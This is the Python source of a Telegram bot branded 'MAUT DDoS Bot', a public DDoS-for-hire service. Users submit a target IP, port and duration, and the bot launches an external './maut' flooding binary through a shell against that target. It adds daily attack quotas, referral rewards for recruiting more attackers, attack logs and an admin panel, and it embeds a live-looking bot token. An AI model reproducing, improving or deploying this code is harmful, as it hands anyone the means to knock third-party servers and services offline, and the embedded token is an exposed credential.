import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock
import sqlite3
import threading

# Bot configuration
bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
admin_id = {"8167507955"}  # Add all admin IDs here
DB_FILE = "maut_bot.db"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 600  # 5 minutes
MAX_ATTACK_TIME = 240  # 4 minutes
MAX_DAILY_ATTACKS = 10  # 10 attacks per day
ATTACKS_PER_INVITE = 2  # 2 bonus attacks per invite
IMAGE_URL = "https://t.me/gggkkkggggiii/9"
SPAM_LIMIT = 5  # Max 5 messages per 10 seconds
SPAM_WINDOW = 10  # 10 second window
BAN_TIME = 3600  # 1 hour ban for spammers

# Initialize database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                     (user_id TEXT PRIMARY KEY, 
                      attacks_today INTEGER DEFAULT 0, 
                      last_attack_date TEXT,
                      total_attacks INTEGER DEFAULT 0,
                      invites INTEGER DEFAULT 0,
                      is_banned INTEGER DEFAULT 0,
                      ban_reason TEXT DEFAULT '',
                      ban_end TEXT DEFAULT '')''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS cooldown 
                     (user_id TEXT PRIMARY KEY, 
                      cooldown_end TEXT)''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS active_attacks 
                     (user_id TEXT PRIMARY KEY,
                      start_time TEXT,
                      duration INTEGER)''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
                     (referrer_id TEXT,
                      referred_id TEXT,
                      PRIMARY KEY (referrer_id, referred_id))''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS spam_protection
                     (user_id TEXT PRIMARY KEY,
                      message_count INTEGER DEFAULT 0,
                      last_message_time REAL DEFAULT 0)''')
    
    conn.commit()
    conn.close()

# Database helper functions
def db_execute(query, params=(), fetch=False):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    try:
        cursor.execute(query, params)
        if fetch:
            result = cursor.fetchall()
        else:
            result = None
        conn.commit()
    except Exception as e:
        print(f"Database error: {e}")
        result = None
    finally:
        conn.close()
    return result

def get_user(user_id):
    result = db_execute("SELECT * FROM users WHERE user_id=?", (user_id,), fetch=True)
    return result[0] if result else None

def create_user(user_id):
    db_execute("INSERT OR IGNORE INTO users (user_id, attacks_today, last_attack_date) VALUES (?, 0, ?)", 
               (user_id, datetime.date.today().isoformat()))

def log_attack(user_id, target, port, time):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
    except Exception as e:
        print(f"Logging error: {e}")

# Spam protection system
user_message_count = {}
spam_lock = Lock()
banned_users = {}

def check_spam(user_id):
    now = time.time()
    with spam_lock:
        # Check if user is banned
        if is_banned(user_id):
            return True
        
        # Get or initialize user spam data
        result = db_execute("SELECT message_count, last_message_time FROM spam_protection WHERE user_id=?", 
                          (user_id,), fetch=True)
        
        if result:
            count, last_time = result[0]
            if now - last_time > SPAM_WINDOW:
                count = 0
        else:
            count = 0
        
        # Update count
        count += 1
        db_execute("INSERT OR REPLACE INTO spam_protection (user_id, message_count, last_message_time) VALUES (?, ?, ?)",
                  (user_id, count, now))
        
        if count > SPAM_LIMIT:
            # Ban the user temporarily
            ban_user(user_id, BAN_TIME//3600, "Spam detected")
            return True
    return False

def ban_user(user_id, duration_hours=24, reason=""):
    ban_end = time.time() + (duration_hours * 3600)
    with spam_lock:
        banned_users[user_id] = ban_end
    db_execute("UPDATE users SET is_banned=1, ban_reason=?, ban_end=? WHERE user_id=?",
              (reason, datetime.datetime.fromtimestamp(ban_end).isoformat(), user_id))

def unban_user(user_id):
    with spam_lock:
        if user_id in banned_users:
            del banned_users[user_id]
    db_execute("UPDATE users SET is_banned=0, ban_reason='', ban_end='' WHERE user_id=?", (user_id,))

def is_banned(user_id):
    # Check memory first
    now = time.time()
    with spam_lock:
        if user_id in banned_users:
            if banned_users[user_id] > now:
                return True
            else:
                del banned_users[user_id]
    
    # Check database
    result = db_execute("SELECT ban_end FROM users WHERE user_id=? AND is_banned=1", (user_id,), fetch=True)
    if result:
        ban_end = datetime.datetime.fromisoformat(result[0][0]).timestamp()
        if ban_end > now:
            with spam_lock:
                banned_users[user_id] = ban_end
            return True
        else:
            unban_user(user_id)
    return False

# Attack functions
def is_attack_active():
    result = db_execute("SELECT COUNT(*) FROM active_attacks", fetch=True)
    return result[0][0] > 0 if result else False

def add_active_attack(user_id, attack_time):
    db_execute("INSERT INTO active_attacks (user_id, start_time, duration) VALUES (?, ?, ?)",
               (user_id, datetime.datetime.now().isoformat(), attack_time))

def remove_active_attack(user_id):
    db_execute("DELETE FROM active_attacks WHERE user_id=?", (user_id,))

def get_active_attack_info():
    result = db_execute("SELECT user_id, start_time, duration FROM active_attacks LIMIT 1", fetch=True)
    if not result:
        return None
    
    user_id, start_time_str, duration = result[0]
    start_time = datetime.datetime.fromisoformat(start_time_str)
    elapsed = (datetime.datetime.now() - start_time).seconds
    remaining = max(0, duration - elapsed)
    return user_id, remaining

def get_user_attack_count(user_id):
    user = get_user(user_id)
    if not user:
        return 0
    
    # Reset daily count if it's a new day
    today = datetime.date.today().isoformat()
    if user[2] != today:
        db_execute("UPDATE users SET attacks_today=0, last_attack_date=? WHERE user_id=?", 
                  (today, user_id))
        return 0
    
    return user[1]

def increment_attack_count(user_id):
    today = datetime.date.today().isoformat()
    db_execute('''UPDATE users 
                 SET attacks_today = attacks_today + 1, 
                     last_attack_date = ?,
                     total_attacks = total_attacks + 1
                 WHERE user_id=?''', 
              (today, user_id))

def set_cooldown(user_id):
    cooldown_end = (datetime.datetime.now() + datetime.timedelta(seconds=COOLDOWN_TIME)).isoformat()
    db_execute("INSERT OR REPLACE INTO cooldown (user_id, cooldown_end) VALUES (?, ?)", 
               (user_id, cooldown_end))

def is_on_cooldown(user_id):
    result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
    if not result:
        return False
    
    cooldown_end = datetime.datetime.fromisoformat(result[0][0])
    return datetime.datetime.now() < cooldown_end

def get_cooldown_remaining(user_id):
    result = db_execute("SELECT cooldown_end FROM cooldown WHERE user_id=?", (user_id,), fetch=True)
    if not result:
        return 0
    
    cooldown_end = datetime.datetime.fromisoformat(result[0][0])
    remaining = (cooldown_end - datetime.datetime.now()).seconds
    return max(0, remaining)

# Referral system
def add_referral(referrer_id, referred_id):
    try:
        # Check if this is a valid new referral
        if referrer_id == referred_id:
            return False
            
        # Check if this referral already exists
        existing = db_execute("SELECT 1 FROM referrals WHERE referrer_id=? AND referred_id=?", 
                            (referrer_id, referred_id), fetch=True)
        if existing:
            return False
            
        # Create both users if they don't exist
        create_user(referrer_id)
        create_user(referred_id)
        
        # Add the referral record
        db_execute("INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)", 
                  (referrer_id, referred_id))
        
        # Give bonus to referrer
        db_execute("UPDATE users SET invites = invites + 1, attacks_today = attacks_today + ? WHERE user_id=?", 
                  (ATTACKS_PER_INVITE, referrer_id))
        
        # Give bonus to referred user
        db_execute("UPDATE users SET attacks_today = attacks_today + ? WHERE user_id=?", 
                  (ATTACKS_PER_INVITE, referred_id))
        
        return True
    except Exception as e:
        print(f"Referral error: {e}")
        return False

def get_user_stats(user_id):
    user = get_user(user_id)
    if not user:
        return None
    
    today = datetime.date.today().isoformat()
    attacks_remaining = max(0, MAX_DAILY_ATTACKS - user[1]) if user[2] == today else MAX_DAILY_ATTACKS
    invites = user[4]
    
    return {
        'attacks_today': user[1],
        'attacks_remaining': attacks_remaining,
        'total_attacks': user[3],
        'invites': invites,
        'bonus_attacks': invites * ATTACKS_PER_INVITE,
        'is_banned': user[5],
        'ban_reason': user[6],
        'ban_end': user[7]
    }

# Spam protection decorator
def spam_protected(func):
    def wrapper(message):
        user_id = str(message.chat.id)
        if is_banned(user_id):
            return bot.reply_to(message, "❌ You are temporarily banned from using this bot.")
        if check_spam(user_id):
            return bot.reply_to(message, "⚠️ You're sending too many requests. Please wait.")
        return func(message)
    return wrapper

# Command handlers
@bot.message_handler(commands=['start'])
@spam_protected
def start_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    # Check for referral
    referral_success = False
    if len(message.text.split()) > 1:
        referrer_id = message.text.split()[1]
        if referrer_id.isdigit() and referrer_id != user_id:
            referral_success = add_referral(referrer_id, user_id)
    
    caption = """
🚀 *Welcome to MAUT DDoS Bot* 🚀

*Public Access Features:*
- 10 free attacks per day
- +2 attacks for each friend you invite
- +2 attacks when you join via invite link

*Available Commands:*
/maut <ip> <port> <time> - Start attack
/mystats - Check your stats
/invite - Get your invite link
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    
    if referral_success:
        caption += "\n🎉 You received +2 bonus attacks for joining via invite link!"
    
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, caption, parse_mode="Markdown")
        print(f"Error sending image: {e}")

@bot.message_handler(commands=['maut'])
@spam_protected
def handle_attack_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    # Check if banned
    if is_banned(user_id):
        return bot.reply_to(message, "❌ You are banned from using this bot.")
    
    # Check if another attack is active
    active_info = get_active_attack_info()
    if active_info:
        active_user_id, remaining = active_info
        try:
            active_user = bot.get_chat(active_user_id)
            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {remaining} seconds.")
        except:
            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
    
    # Check cooldown
    if is_on_cooldown(user_id):
        remaining = get_cooldown_remaining(user_id)
        return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
    
    # Check daily attack limit
    stats = get_user_stats(user_id)
    if stats['attacks_remaining'] <= 0:
        return bot.reply_to(message, f"❌ Daily limit reached (10 attacks). Invite friends for more attacks (/invite).")
    
    # Parse command
    try:
        args = message.text.split()
        if len(args) != 4:
            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
        
        ip = args[1]
        port = args[2]
        attack_time = args[3]
        
        # Validate IP
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
        
        # Validate port
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            return bot.reply_to(message, "❌ Invalid port (1-65535)")
        
        # Validate time
        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
        
        # Show confirmation
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Start Attack", callback_data=f"start_attack|{ip}|{port}|{attack_time}"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Summary:*\n\n"
            f"🌐 IP: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱ Time: `{attack_time}`s\n"
            f"📊 Attacks left today: {stats['attacks_remaining']-1}\n\n"
            f"Confirm attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.message.chat.id)
    
    if call.data.startswith("start_attack"):
        _, ip, port, attack_time = call.data.split("|")
        
        try:
            # Mark attack as active
            add_active_attack(user_id, int(attack_time))
            
            # Execute attack
            subprocess.Popen(f"./maut {ip} {port} {attack_time} 900", shell=True)
            log_attack(user_id, ip, port, attack_time)
            set_cooldown(user_id)
            increment_attack_count(user_id)
            
            # Update message
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔥 *Attack Launched!* 🔥\n\n"
                     f"🌐 Target: `{ip}`\n"
                     f"🔌 Port: `{port}`\n"
                     f"⏱ Duration: `{attack_time}`s\n"
                     f"📊 Attacks left today: {get_user_stats(user_id)['attacks_remaining']}\n\n"
                     f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
                parse_mode="Markdown"
            )
            
            # Schedule attack completion message
            attack_duration = int(attack_time)
            time.sleep(attack_duration)
            
            # Send completion message
            bot.send_message(
                call.message.chat.id,
                f"✅ *Attack Completed!*\n\n"
                f"🌐 Target: `{ip}`\n"
                f"⏱ Duration: `{attack_time}`s\n\n"
                f"Cooldown: {COOLDOWN_TIME//60} minutes",
                parse_mode="Markdown"
            )
            
            # Remove from active attacks
            remove_active_attack(user_id)
            
            # Add new attack button
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
            
        except Exception as e:
            remove_active_attack(user_id)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"❌ Error: {str(e)}"
            )
    
    elif call.data == "cancel_attack":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="❌ Attack cancelled"
        )
    
    elif call.data == "new_attack":
        if is_on_cooldown(user_id):
            remaining = get_cooldown_remaining(user_id)
            return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
        
        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
    
    elif call.data.startswith("admin_"):
        if user_id not in admin_id:
            return bot.answer_callback_query(call.id, "❌ Admin only")
        
        action = call.data.split('_')[1]
        
        if action == "stats":
            total_users = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
            today_attacks = db_execute("SELECT SUM(attacks_today) FROM users WHERE last_attack_date=?", 
                                      (datetime.date.today().isoformat(),), fetch=True)[0][0] or 0
            total_attacks = db_execute("SELECT SUM(total_attacks) FROM users", fetch=True)[0][0] or 0
            banned_count = db_execute("SELECT COUNT(*) FROM users WHERE is_banned=1", fetch=True)[0][0]
            
            stats = f"""
📊 *Admin Stats* 📊

• Total users: {total_users}
• Banned users: {banned_count}
• Attacks today: {today_attacks}
• Total attacks: {total_attacks}
"""
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=stats,
                parse_mode="Markdown"
            )
        
        elif action == "ban":
            msg = bot.send_message(call.message.chat.id, "Send user ID to ban and duration in hours (e.g., '12345 24'):")
            bot.register_next_step_handler(msg, process_ban)
        
        elif action == "unban":
            msg = bot.send_message(call.message.chat.id, "Send user ID to unban:")
            bot.register_next_step_handler(msg, process_unban)
        
        elif action == "stop":
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="🛑 Bot is shutting down..."
            )
            os._exit(0)
    
    bot.answer_callback_query(call.id)

def process_ban(message):
    if str(message.chat.id) not in admin_id:
        return
    
    try:
        parts = message.text.split()
        user_to_ban = parts[0]
        duration = int(parts[1]) if len(parts) > 1 else 24
        ban_user(user_to_ban, duration, "Admin ban")
        bot.reply_to(message, f"✅ User {user_to_ban} has been banned for {duration} hours.")
    except:
        bot.reply_to(message, "❌ Invalid format. Use: 'user_id hours'")

def process_unban(message):
    if str(message.chat.id) not in admin_id:
        return
    
    try:
        user_to_unban = message.text.strip()
        unban_user(user_to_unban)
        bot.reply_to(message, f"✅ User {user_to_unban} has been unbanned.")
    except:
        bot.reply_to(message, "❌ Invalid user ID")

@bot.message_handler(commands=['mystats'])
@spam_protected
def show_stats(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    stats = get_user_stats(user_id)
    if not stats:
        return bot.reply_to(message, "❌ Error getting stats.")
    
    response = f"""
📊 *Your Stats* 📊

• Attacks today: {stats['attacks_today']}/{MAX_DAILY_ATTACKS + stats['bonus_attacks']}
• Attacks remaining: {stats['attacks_remaining']}
• Total attacks: {stats['total_attacks']}
• Friends invited: {stats['invites']}
• Bonus attacks earned: {stats['bonus_attacks']}
"""
    if stats['is_banned']:
        ban_end = datetime.datetime.fromisoformat(stats['ban_end'])
        response += f"\n⚠️ *Account Status:* BANNED\n"
        response += f"• Reason: {stats['ban_reason']}\n"
        response += f"• Until: {ban_end.strftime('%Y-%m-%d %H:%M:%S')}"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['invite'])
@spam_protected
def invite_command(message):
    user_id = str(message.chat.id)
    create_user(user_id)
    
    bot_name = bot.get_me().username
    invite_link = f"https://t.me/{bot_name}?start={user_id}"
    
    stats = get_user_stats(user_id)
    
    response = f"""
📨 *Invite Friends & Earn Attacks* 📨

🔗 Your invite link:
{invite_link}

💎 For each friend who joins using your link:
• You get +{ATTACKS_PER_INVITE} attacks
• They get +{ATTACKS_PER_INVITE} attacks

📊 You've invited {stats['invites']} friends and earned {stats['bonus_attacks']} bonus attacks!
"""
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['mylogs'])
@spam_protected
def my_logs(message):
    user_id = str(message.chat.id)
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No attack history.")
    
    user_logs = []
    with open(LOG_FILE, "r") as f:
        for line in f:
            if str(user_id) in line or (message.from_user.username and f"@{message.from_user.username}" in line):
                user_logs.append(line)
    
    if not user_logs:
        return bot.reply_to(message, "ℹ️ No attacks found in your history.")
    
    bot.reply_to(message, f"📜 Your Attack History (last 10):\n\n" + "".join(user_logs[-10:]))

@bot.message_handler(commands=['help'])
@spam_protected
def help_command(message):
    help_text = """
🛠 *MAUT Bot Help* 🛠

*Public Commands:*
/maut <ip> <port> <time> - Start attack
/mystats - Check your stats
/invite - Get invite link
/mylogs - View your history
/rules - Usage guidelines

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
@spam_protected
def rules_command(message):
    rules = """
📜 *Usage Rules* 📜

1. Max attack time: 240 seconds
2. 10 attacks per day (earn more by inviting friends)
3. 5 minutes cooldown between attacks
4. No concurrent attacks
5. No illegal targets

Violations will result in ban.
"""
    bot.reply_to(message, rules, parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
@spam_protected
def admin_panel(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        return
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        types.InlineKeyboardButton("🔒 Ban User", callback_data="admin_ban"),
        types.InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"),
        types.InlineKeyboardButton("🛑 Stop Bot", callback_data="admin_stop")
    )
    
    bot.reply_to(message, "👑 *Admin Panel* 👑", reply_markup=markup, parse_mode="Markdown")

# Bot runner with error handling
def run_bot():
    while True:
        try:
            print("⚡ MAUT Bot Started ⚡")
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:
            print(f"Bot crashed: {e}")
            time.sleep(5)

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Clean up any active attacks on startup
    db_execute("DELETE FROM active_attacks")
    
    # Run in a separate thread to prevent blocking
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Shutting down...")
        os._exit(0)
